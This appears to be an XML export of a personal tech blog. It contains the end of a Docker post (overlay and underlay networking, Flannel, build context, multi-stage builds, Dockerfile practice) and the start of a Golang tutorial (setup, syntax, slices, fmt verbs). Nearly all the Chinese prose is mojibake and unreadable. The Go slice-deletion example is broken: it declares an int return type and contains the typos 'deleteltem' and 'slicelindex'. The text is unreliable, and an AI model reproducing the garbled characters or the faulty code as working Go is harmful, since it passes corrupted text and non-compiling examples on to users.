src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/65.png"><br>æŠŠè¿™ä¸¤ä¸ªè¿æ¥èµ·æ¥ä»¥ä¾¿åœ¨listä¸­æ˜¾ç¤º<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/66.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/67.png"><br>aå£é“¾æ¥docker0<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/68.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/69.png"><br>bå£é“¾æ¥<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/70.png"><br>æŸ¥çœ‹é…ç½®<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/71.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/72.png"><br>å†æ¬¡æŸ¥çœ‹é…ç½®æƒ…å†µ<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/73.png"><br>curlä¸€ä¸‹<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/74.png"></p><h3 id="Underlay"><a href="#Underlay" class="headerlink" title="Underlay"></a>Underlay</h3><p>ç”¨ä¸€ä¸ªç½‘æ¡¥é“¾æ¥ç‰©ç†ç½‘ç»œï¼Œä¸»æœºç½‘å¡å’Œå®¹å™¨ç½‘å¡éƒ½èµ°è¿™ä¸ªç½‘æ¡¥<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/75.png"></p><h3 id="Overlay-network-sample-Flannel"><a href="#Overlay-network-sample-Flannel" class="headerlink" title="Overlay network sample - Flannel"></a>Overlay network sample - Flannel</h3><p>éš§é“æŠ€æœ¯ï¼šå®¹å™¨åŒ…ä¸Šé¢å†åŠ ä¸€å±‚ï¼Œåˆ°äº†å†è§£åŒ…<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/76.png"><br>ä»»ä½•æ•°æ®å‡ºå»éƒ½è¢«flanneldå°ä¸€å±‚<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/77.png"></p><h4 id="Flannel-packet-sample"><a href="#Flannel-packet-sample" class="headerlink" title="Flannel packet sample"></a>Flannel packet sample</h4><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/78.png"></p><h2 id="åˆ›å»º-docker-é•œåƒ"><a href="#åˆ›å»º-docker-é•œåƒ" class="headerlink" title="åˆ›å»º docker é•œåƒ"></a>åˆ›å»º docker é•œåƒ</h2><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/79.png"></p><h3 id="å›é¡¾12-Factor-ä¹‹è¿›ç¨‹"><a href="#å›é¡¾12-Factor-ä¹‹è¿›ç¨‹" class="headerlink" title="å›é¡¾12 Factor ä¹‹è¿›ç¨‹"></a>å›é¡¾12 Factor ä¹‹è¿›ç¨‹</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/80.png"></p><h3 id="ç†è§£æ„å»ºä¸Šä¸‹æ–‡-Build-Context"><a href="#ç†è§£æ„å»ºä¸Šä¸‹æ–‡-Build-Context" class="headerlink" title="ç†è§£æ„å»ºä¸Šä¸‹æ–‡(Build Context)"></a>ç†è§£æ„å»ºä¸Šä¸‹æ–‡(Build Context)</h3><p>docker buildçš„æ—¶å€™ä¼šæŠŠå½“å‰ç›®å½•é‡Œçš„æ‰€æœ‰æ–‡ä»¶éƒ½å‘ç»™docker demon<br>æ‰€ä»¥åƒä¸‡ä¸è¦åœ¨æ ¹ç›®å½•build<br>å¯¹äºä¸‹é¢è¿™ç§æŒ‡ä»¤ï¼Œç›®å½•å¿…é¡»åœ¨ä¸Šä¸‹æ–‡ç¯å¢ƒé‡Œæ‰è¡Œ<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/81.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/82.png"></p><h3 id="é•œåƒæ„å»ºæ—¥å¿—"><a href="#é•œåƒæ„å»ºæ—¥å¿—" class="headerlink" title="é•œåƒæ„å»ºæ—¥å¿—"></a>é•œåƒæ„å»ºæ—¥å¿—</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/83.png"></p><h3 id="Build-Cache"><a href="#Build-Cache" class="headerlink" title="Build Cache"></a>Build Cache</h3><p>è¶Šç¨³å®šçš„æ”¾åœ¨ä¸‹é¢ï¼Œå˜åŠ¨å¤šçš„æ”¾åœ¨ä¸Šé¢<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/84.png"></p><h3 id="å¤šæ®µæ„å»º-Multi-stage-build"><a href="#å¤šæ®µæ„å»º-Multi-stage-build" class="headerlink" title="å¤šæ®µæ„å»º(Multi-stage build)"></a>å¤šæ®µæ„å»º(Multi-stage build)</h3><p>æœ€åç›´æ‰“åŒ…äº†ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/85.png"></p><h3 id="Dockerfile-å¸¸ç”¨æŒ‡ä»¤"><a href="#Dockerfile-å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="Dockerfile å¸¸ç”¨æŒ‡ä»¤"></a>Dockerfile å¸¸ç”¨æŒ‡ä»¤</h3><p>FROM scratchå°±æ˜¯ç©ºçš„ï¼Œå‡ºç°é—®é¢˜åªèƒ½ç™»ä¸»æœºå»çœ‹<br>LABEL æ–¹ä¾¿æŸ¥è¯¢</p><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/86.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/87.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/88.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/89.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/90.png"><br>å®¹å™¨çš„è¿ç»´æ˜¯é¢å‘åº”ç”¨çš„è¿ç»´è€Œä¸æ˜¯æ“ä½œç³»ç»Ÿçš„è¿ç»´<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/91.png"></p><h3 id="Dockerfile-æœ€ä½³å®è·µ"><a href="#Dockerfile-æœ€ä½³å®è·µ" class="headerlink" title="Dockerfile æœ€ä½³å®è·µ"></a>Dockerfile æœ€ä½³å®è·µ</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/92.png"></p><h3 id="å¤šè¿›ç¨‹çš„å®¹å™¨é•œåƒ"><a href="#å¤šè¿›ç¨‹çš„å®¹å™¨é•œåƒ" class="headerlink" title="å¤šè¿›ç¨‹çš„å®¹å™¨é•œåƒ"></a>å¤šè¿›ç¨‹çš„å®¹å™¨é•œåƒ</h3><p>éœ€è¦å¤šä¸ªè¿›ç¨‹å¹¶è¡Œå¯ä»¥ç”¨tiniä½œä¸ºåˆå§‹åŒ–è¿›ç¨‹<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/93.png"></p><h3 id="Docker-é•œåƒç®¡ç†"><a href="#Docker-é•œåƒç®¡ç†" class="headerlink" title="Docker é•œåƒç®¡ç†"></a>Docker é•œåƒç®¡ç†</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/94.png"></p><h3 id="åŸºäº-Docker-é•œåƒçš„ç‰ˆæœ¬ç®¡ç†"><a href="#åŸºäº-Docker-é•œåƒçš„ç‰ˆæœ¬ç®¡ç†" class="headerlink" title="åŸºäº Docker é•œåƒçš„ç‰ˆæœ¬ç®¡ç†"></a>åŸºäº Docker é•œåƒçš„ç‰ˆæœ¬ç®¡ç†</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/95.png"></p><h3 id="Docker-tag-ä¸-github-çš„ç‰ˆæœ¬ç®¡ç†åˆåŠ›"><a href="#Docker-tag-ä¸-github-çš„ç‰ˆæœ¬ç®¡ç†åˆåŠ›" class="headerlink" title="Docker tag ä¸ github çš„ç‰ˆæœ¬ç®¡ç†åˆåŠ›"></a>Docker tag ä¸ github çš„ç‰ˆæœ¬ç®¡ç†åˆåŠ›</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/96.png"></p><h3 id="é•œåƒä»“åº“"><a href="#é•œåƒä»“åº“" class="headerlink" title="é•œåƒä»“åº“"></a>é•œåƒä»“åº“</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/97.png"></p><h3 id="Dockerä¼˜åŠ¿"><a href="#Dockerä¼˜åŠ¿" class="headerlink" title="Dockerä¼˜åŠ¿"></a>Dockerä¼˜åŠ¿</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/98.png"></p><h3 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/99.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/100.png"></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/101.png"></p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golangç®€æ˜“æ•™ç¨‹</title>
      <link href="/2022/03/12/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"/>
      <url>/2022/03/12/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸ºä»€ä¹ˆéœ€è¦go"><a href="#ä¸ºä»€ä¹ˆéœ€è¦go" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦go"></a>ä¸ºä»€ä¹ˆéœ€è¦go</h2><ul><li><p>ç¼–è¯‘é«˜æ•ˆ</p></li><li><p>æ”¯æŒé«˜å¹¶å‘</p></li><li><p>é¢å‘åƒåœ¾å›æ”¶</p><h3 id="åˆ ç¹å°±ç®€"><a href="#åˆ ç¹å°±ç®€" class="headerlink" title="åˆ ç¹å°±ç®€"></a>åˆ ç¹å°±ç®€</h3></li><li><p>ä¸æ”¯æŒå‡½æ•°é‡è½½</p></li><li><p>ä¸æ”¯æŒéšå¼è½¬æ¢</p></li><li><p>ä¸æ”¯æŒç»§æ‰¿</p></li><li><p>ä¸æ”¯æŒåŠ¨æ€é“¾æ¥åº“</p></li><li><p>ä¸æ”¯æŒåŠ¨æ€åŠ è½½ä»£ç </p></li><li><p>é€šè¿‡recoverå’Œpanicæ›¿ä»£å¼‚å¸¸æœºåˆ¶</p></li><li><p>ä¸æ”¯æŒæ–­è¨€</p></li><li><p>ä¸æ”¯æŒé™æ€å˜é‡</p><h3 id="goè¯­è¨€ç‰¹æ€§æ¥æº"><a href="#goè¯­è¨€ç‰¹æ€§æ¥æº" class="headerlink" title="goè¯­è¨€ç‰¹æ€§æ¥æº"></a>goè¯­è¨€ç‰¹æ€§æ¥æº</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/0.png"></p><h2 id="é…ç½®go"><a href="#é…ç½®go" class="headerlink" title="é…ç½®go"></a>é…ç½®go</h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/1.png"><br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/2.png"></p><h3 id="windowsä¸‹ç¯å¢ƒå˜é‡"><a href="#windowsä¸‹ç¯å¢ƒå˜é‡" class="headerlink" title="windowsä¸‹ç¯å¢ƒå˜é‡"></a>windowsä¸‹ç¯å¢ƒå˜é‡</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/3.png"><br>pathä¸‹æ·»åŠ <br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/4.png"><br>Golandä¸­æ·»åŠ ä»£ç†<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/5.png"></p><h3 id="GoLandç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶"><a href="#GoLandç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="GoLandç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶"></a>GoLandç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</h3><p>æ‰“å¼€è¿è¡Œè®¾ç½®<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/6.png"></p></li></ul><p>æ–°å»ºä¸€ä¸ªgo build<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/7.png"></p><p>æ–°å¢ä¸€ä¸ªè®¾ç½®ï¼Œå‘½åä¸ºâ€œbuild windowsâ€ï¼Œèµ‹å€¼å¦‚å›¾<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/8.png"><br>å…¶ä¸­æœ€é‡è¦çš„æ˜¯Environment<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/9.png"></p><p>é€‰æ‹©æ­£ç¡®çš„é…ç½®ï¼Œå¼€å§‹ç¼–è¯‘ï¼ˆè¿è¡Œï¼‰<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/10.png"></p><p>ä¼šç›´æ¥ç”Ÿæˆexe<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/11.png"></p><p>åŒå‡»å¯ä»¥ç›´æ¥è¿è¡Œ<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/12.png"></p><p>å¦‚æœæ˜¯æƒ³ç¼–è¯‘ä¸ºlinuxå¯ç”¨çš„ï¼Œé…ç½®å¦‚ä¸‹ï¼ˆæ³¨æ„æœ‰ä¸‰ä¸ªå˜åŠ¨ï¼Œé¦–å…ˆæŒ‡å®šä¸€ä¸ªæ–°çš„è¾“å‡ºç›®å½•ï¼Œå…¶æ¬¡è¦åé€‰æ‰Checkboxï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯windowså¹³å°ï¼Œç¼–è¯‘å®Œæ— æ³•ç›´æ¥æ‰§è¡Œï¼Œå†æ¬¡è¦æŒ‡å®šGOOSä¸ºlinuxï¼‰<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/13.png"></p><p>è¾“å‡ºå¦‚ä¸‹<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/14.png"></p><p>ä¸Šä¼ åˆ°æœåŠ¡å™¨<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/15.png"></p><p>æ”¹æƒé™åå¯ä»¥è¿è¡Œ<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/16.png"></p><h3 id="ä¸€äº›åŸºæœ¬å‘½ä»¤"><a href="#ä¸€äº›åŸºæœ¬å‘½ä»¤" class="headerlink" title="ä¸€äº›åŸºæœ¬å‘½ä»¤"></a>ä¸€äº›åŸºæœ¬å‘½ä»¤</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/17.png"><br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/18.png"></p><h4 id="go-test"><a href="#go-test" class="headerlink" title="go test"></a>go test</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/19.png"></p><h4 id="go-vet"><a href="#go-vet" class="headerlink" title="go vet"></a>go vet</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/20.png"></p><h2 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h2><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/21.png"></p><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/22.png"><br>æ¯ä¸ªswitché»˜è®¤å¸¦ä¸€ä¸ªbreak</p><h3 id="forå¾ªç¯"><a href="#forå¾ªç¯" class="headerlink" title="forå¾ªç¯"></a>forå¾ªç¯</h3><p>goä¸­æ²¡æœ‰whileå¾ªç¯<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/23.png"></p><h4 id="for-range"><a href="#for-range" class="headerlink" title="for-range"></a>for-range</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/24.png"><br>è¿™ä¸ªå’Œpythonç±»ä¼¼</p><h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">name := flag.String(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;world&quot;</span>, <span class="string">&quot;specify the name you want to say hi&quot;</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line">fmt.Println(<span class="string">&quot;os args is:&quot;</span>, os.Args)</span><br><span class="line">fmt.Println(<span class="string">&quot;input parameter is:&quot;</span>, *name)</span><br><span class="line">fullString := fmt.Sprintf(<span class="string">&quot;Hello %s from Go\n&quot;</span>, *name)</span><br><span class="line">fmt.Println(fullString)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>go run ./main --name myname</code>çš„æ„æ€æ˜¯æŠŠå‚æ•°åä¸ºnameçš„å‚æ•°mynameä¼ ç»™os.Args<br>flag.String()ç”¨äºå®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²çš„å…·æœ‰æŒ‡å®šåç§°ã€é»˜è®¤å€¼å’Œç”¨æ³•å­—ç¬¦ä¸²çš„å­—ç¬¦ä¸²æ ‡å¿—ã€‚è¿”å›å€¼æ˜¯å­˜å‚¨æ ‡å¿—å€¼çš„å­—ç¬¦ä¸²å˜é‡çš„åœ°å€ã€‚<br>flag.Parse()ç”¨äºå®šä¹‰åœ¨æ¥æ”¶å‚æ•°ä¹‹å‰ã€‚</p><h2 id="å˜é‡å®šä¹‰"><a href="#å˜é‡å®šä¹‰" class="headerlink" title="å˜é‡å®šä¹‰"></a>å˜é‡å®šä¹‰</h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/25.png"><br><strong>ï¼š=ç»“æ„ä¸èƒ½åœ¨å‡½æ•°å¤–ä½¿ç”¨</strong></p><h2 id="ç±»å‹è½¬æ¢"><a href="#ç±»å‹è½¬æ¢" class="headerlink" title="ç±»å‹è½¬æ¢"></a>ç±»å‹è½¬æ¢</h2><p>goä¸å­˜åœ¨éšå¼è½¬æ¢ï¼Œå› ä¸ºéšå¼è½¬æ¢å®¹æ˜“å‡ºé”™<br>æ‰€ä»¥å¿…é¡»å¼ºåˆ¶è½¬æ¢<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/26.png"></p><h2 id="æ•°ç»„å’Œåˆ‡ç‰‡"><a href="#æ•°ç»„å’Œåˆ‡ç‰‡" class="headerlink" title="æ•°ç»„å’Œåˆ‡ç‰‡"></a>æ•°ç»„å’Œåˆ‡ç‰‡</h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/27.png"><br>åˆ‡ç‰‡ç±»ä¼¼äºåŠ¨æ€æ•°ç»„<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/28.png"></p><h3 id="åˆ‡ç‰‡æ·»åŠ å…ƒç´ "><a href="#åˆ‡ç‰‡æ·»åŠ å…ƒç´ " class="headerlink" title="åˆ‡ç‰‡æ·»åŠ å…ƒç´ "></a>åˆ‡ç‰‡æ·»åŠ å…ƒç´ </h3><p><code>mySLice1 = append (mySlice, 1)</code></p><h3 id="åˆ‡ç‰‡åˆ é™¤å…ƒç´ "><a href="#åˆ‡ç‰‡åˆ é™¤å…ƒç´ " class="headerlink" title="åˆ‡ç‰‡åˆ é™¤å…ƒç´ "></a>åˆ‡ç‰‡åˆ é™¤å…ƒç´ </h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deleteltem</span><span class="params">(slice []<span class="keyword">int</span>, index <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">append</span>(slice[:index], slicelindex+<span class="number">1</span>:]...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ„é€ åˆ‡ç‰‡"><a href="#æ„é€ åˆ‡ç‰‡" class="headerlink" title="æ„é€ åˆ‡ç‰‡"></a>æ„é€ åˆ‡ç‰‡</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/29.png"></p><h3 id="å…³äºåˆ‡ç‰‡çš„å¸¸è§é—®é¢˜"><a href="#å…³äºåˆ‡ç‰‡çš„å¸¸è§é—®é¢˜" class="headerlink" title="å…³äºåˆ‡ç‰‡çš„å¸¸è§é—®é¢˜"></a>å…³äºåˆ‡ç‰‡çš„å¸¸è§é—®é¢˜</h3><p>çº æ­£ï¼š a := []int{}<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/30.png"><br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/31.png"><br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/32.png"><br>båŸæ¥çš„ç©ºé—´æ»¡äº†ï¼Œå¯¼è‡´cå’ŒaæŒ‡å‘ä¸åŒç©ºé—´<br>=&gt;ä¸è¦append bå†èµ‹ç»™aï¼Œç›´æ¥èµ‹ç»™bè‡ªå·±<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/33.png"><br>ä¿®æ”¹å˜é‡valueä¸ä¼šæ”¹å˜åˆ‡ç‰‡é‡Œçš„å€¼<br><strong>goè¯­è¨€é‡Œå…¨éƒ¨éƒ½æ˜¯å€¼ä¼ é€’</strong></p><h2 id="fmtåŒ…çš„printf-æ–¹æ³•"><a href="#fmtåŒ…çš„printf-æ–¹æ³•" class="headerlink" title="fmtåŒ…çš„printf()æ–¹æ³•"></a>fmtåŒ…çš„printf()æ–¹æ³•</h2><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>fmt åŒ…å®ç°äº†æ ¼å¼åŒ– I/O å‡½æ•°ï¼Œç±»ä¼¼äº C çš„ printf å’Œ scanfã€‚æ ¼å¼â€œå ä½ç¬¦â€è¡ç”Ÿè‡ª Cï¼Œä½†æ¯” C æ›´ç®€å•ã€‚<br>[æ‰“å°]<br>å ä½ç¬¦ï¼š</p><h4 id="ä¸€èˆ¬"><a href="#ä¸€èˆ¬" class="headerlink" title="ä¸€èˆ¬"></a>ä¸€èˆ¬</h4><p>%v ç›¸åº”å€¼çš„é»˜è®¤æ ¼å¼ã€‚åœ¨æ‰“å°ç»“æ„ä½“æ—¶ï¼Œâ€œåŠ å·â€æ ‡è®°ï¼ˆ%+vï¼‰ä¼šæ·»åŠ å­—æ®µå<br>%#v ç›¸åº”å€¼çš„ Go è¯­æ³•è¡¨ç¤º<br>%T ç›¸åº”å€¼çš„ç±»å‹çš„ Go è¯­æ³•è¡¨ç¤º<br>%% å­—é¢ä¸Šçš„ç™¾åˆ†å·ï¼Œå¹¶éå€¼çš„å ä½ç¬¦<br>[å¸ƒå°”]<br>%t å•è¯ true æˆ– falseã€‚</p><h4 id="æ•´æ•°"><a href="#æ•´æ•°" class="headerlink" title="æ•´æ•°"></a>æ•´æ•°</h4><p>%b äºŒè¿›åˆ¶è¡¨ç¤º<br>%c ç›¸åº” Unicode ç ç‚¹æ‰€è¡¨ç¤ºçš„å­—ç¬¦<br>%d åè¿›åˆ¶è¡¨ç¤º<br>%o å…«è¿›åˆ¶è¡¨ç¤º<br>%q å•å¼•å·å›´ç»•çš„å­—ç¬¦å­—é¢å€¼ï¼Œç”± Go è¯­æ³•å®‰å…¨åœ°è½¬ä¹‰<br>%x åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œå­—æ¯å½¢å¼ä¸ºå°å†™ a-f<br>%X åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œå­—æ¯å½¢å¼ä¸ºå¤§å†™ A-F<br>%U Unicode æ ¼å¼ï¼šU+1234ï¼Œç­‰åŒäº â€œU+%04Xâ€</p><h4 id="æµ®ç‚¹æ•°åŠå…¶å¤åˆæ„æˆ"><a href="#æµ®ç‚¹æ•°åŠå…¶å¤åˆæ„æˆ" class="headerlink" title="æµ®ç‚¹æ•°åŠå…¶å¤åˆæ„æˆ"></a>æµ®ç‚¹æ•°åŠå…¶å¤åˆæ„æˆ</h4><p>%b æ— å°æ•°éƒ¨åˆ†çš„ï¼ŒæŒ‡æ•°ä¸ºäºŒçš„å¹‚çš„ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸ strconv.FormatFloat çš„ â€˜bâ€™ è½¬æ¢æ ¼å¼ä¸€è‡´ã€‚ä¾‹å¦‚ -123456p-78<br>%e ç§‘å­¦è®¡æ•°æ³•ï¼Œä¾‹å¦‚ -1234.456e+78<br>%E ç§‘å­¦è®¡æ•°æ³•ï¼Œä¾‹å¦‚ -1234.456E+78<br>%f æœ‰å°æ•°ç‚¹è€Œæ— æŒ‡æ•°ï¼Œä¾‹å¦‚ 123.456<br>%g æ ¹æ®æƒ…å†µé€‰æ‹© %e æˆ– %f ä»¥äº§ç”Ÿæ›´ç´§å‡‘çš„ï¼ˆæ— æœ«å°¾çš„ 0ï¼‰è¾“å‡º<br>%G æ ¹æ®æƒ…å†µé€‰æ‹© %E æˆ– %f 